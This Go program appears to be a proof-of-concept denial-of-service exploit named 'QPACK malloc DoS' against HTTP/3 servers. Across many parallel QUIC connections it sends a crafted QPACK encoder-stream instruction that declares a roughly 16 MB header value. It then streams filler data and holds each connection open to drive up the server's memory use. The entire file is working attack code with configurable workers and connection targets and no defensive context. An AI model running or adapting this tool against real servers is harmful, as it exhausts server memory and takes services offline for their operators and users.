package main

import (
	"context"
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"sync/atomic"
	"time"

	"github.com/quic-go/quic-go"
)

const quicVersionDraft29 quic.Version = 0xff00001d

func buildSetCapacity0() []byte {
	return []byte{0x20}
}

func buildInsertHeaderOnly(valLen uint32) []byte {
	buf := []byte{0xC0}
	vl := uint64(valLen)
	if vl < 127 {
		buf = append(buf, byte(vl))
	} else {
		buf = append(buf, 127)
		vl -= 127
		for vl >= 128 {
			buf = append(buf, byte(0x80|(vl&0x7F)))
			vl >>= 7
		}
		buf = append(buf, byte(vl))
	}
	return buf
}

func quicVarint(v uint64) []byte {
	switch {
	case v < 64:
		return []byte{byte(v)}
	case v < 16384:
		b := make([]byte, 2)
		binary.BigEndian.PutUint16(b, uint16(0x4000|v))
		return b
	case v < 1073741824:
		b := make([]byte, 4)
		binary.BigEndian.PutUint32(b, uint32(0x80000000|v))
		return b
	default:
		b := make([]byte, 8)
		binary.BigEndian.PutUint64(b, 0xC000000000000000|v)
		return b
	}
}

var totalConns atomic.Uint64

func main() {
	serverAddr := flag.String("addr", "127.0.0.1:12345", "server address")
	workers := flag.Int("w", 30, "parallel workers")
	touchMB := flag.Int("touch", 4, "touch MB per connection (RSS)")
	targetConn := flag.Int("c", 200, "target connections")
	holdMs := flag.Int("hold", 500, "hold ms per connection")
	quicVer := flag.String("quic-version", "v1", "QUIC version: v1, draft29")
	flag.Parse()

	var (
		ver       quic.Version
		alpn      string
	)
	switch *quicVer {
	case "v1":
		ver = quic.Version1
		alpn = "h3"
	case "draft29":
		ver = quicVersionDraft29
		alpn = "h3-29"
	default:
		fmt.Printf("[-] Unknown version %s (use v1 or draft29)\n", *quicVer)
		return
	}

	valLen := uint32(16777215)
	touchBytes := uint32(*touchMB) * 1024 * 1024
	if touchBytes > valLen {
		touchBytes = valLen
	}

	fmt.Printf("=== QPACK malloc DoS ===\n")
	fmt.Printf("Workers: %d | Touch: %d MB | Hold: %d ms\n", *workers, *touchMB, *holdMs)
	fmt.Printf("Per connection: malloc 16 MB, RSS +%d MB\n", *touchMB)
	if *targetConn > 0 {
		fmt.Printf("Target RSS: %d MB | Target connections: %d\n",
			*touchMB * *targetConn, *targetConn)
	}
	fmt.Printf("Connecting to %s ...\n\n", *serverAddr)

	// === Share ONE Transport (single UDP socket) across all connections ===
	udpConn, err := net.ListenUDP("udp", nil)
	if err != nil {
		panic(err)
	}
	defer udpConn.Close()

	addr, err := net.ResolveUDPAddr("udp", *serverAddr)
	if err != nil {
		panic(err)
	}

	tlsConf := &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         "localhost",
		NextProtos:         []string{alpn},
	}
	quicConf := &quic.Config{
		MaxIdleTimeout: 60 * time.Second,
		Versions:       []quic.Version{ver},
	}

	transport := &quic.Transport{
		Conn: udpConn,
	}
	defer transport.Close()

	// Pre-build static data (reused by all workers)
	encHeader := []byte{0x02}
	encHeader = append(encHeader, buildSetCapacity0()...)
	encHeader = append(encHeader, buildInsertHeaderOnly(valLen)...)

	ctrlData := []byte{0x00}
	settingsPayload := append(quicVarint(0x01), quicVarint(4096)...)
	frame := append(quicVarint(0x04), quicVarint(uint64(len(settingsPayload)))...)
	frame = append(frame, settingsPayload...)
	ctrlData = append(ctrlData, frame...)

	holdDur := time.Duration(*holdMs) * time.Millisecond
	chunkSize := 65536 // 64KB chunks

	done := make(chan bool)
	workerFn := func(id int) {
		// 64KB reusable buffer per worker (not 4MB!)
		smallBuf := make([]byte, chunkSize)

		for {
			select {
			case <-done:
				return
			default:
			}

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			conn, err := transport.Dial(ctx, addr, tlsConf, quicConf)
			cancel()
			if err != nil {
				time.Sleep(20 * time.Millisecond)
				continue
			}

			// Control stream
			if s, e := conn.OpenUniStream(); e == nil {
				s.Write(ctrlData)
			}

			// Encoder stream
			s, err := conn.OpenUniStream()
			if err != nil {
				conn.CloseWithError(0, "err")
				continue
			}

			// QPACK header
			if _, err := s.Write(encHeader); err != nil {
				conn.CloseWithError(0, "err")
				continue
			}

			// Stream touch data in 64KB chunks (no large buffer)
			remaining := int(touchBytes)
			for remaining > 0 {
				toWrite := chunkSize
				if remaining < chunkSize {
					toWrite = remaining
				}
				if _, err := s.Write(smallBuf[:toWrite]); err != nil {
					break
				}
				remaining -= toWrite
			}

			cnt := totalConns.Add(1)
			if cnt%50 == 0 {
				fmt.Printf("[*] %d connections\n", cnt)
			}

			time.Sleep(holdDur)
			conn.CloseWithError(0, "done")
		}
	}

	for i := 0; i < *workers; i++ {
		go workerFn(i)
	}

	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		n := totalConns.Load()
		fmt.Printf("[*] %d connections\n", n)
		if *targetConn > 0 && n >= uint64(*targetConn) {
			fmt.Printf("\n[+] Reached %d connections!\n", *targetConn)
			break
		}
	}

	close(done)
	time.Sleep(100 * time.Millisecond)
	fmt.Println("[*] Done")
}
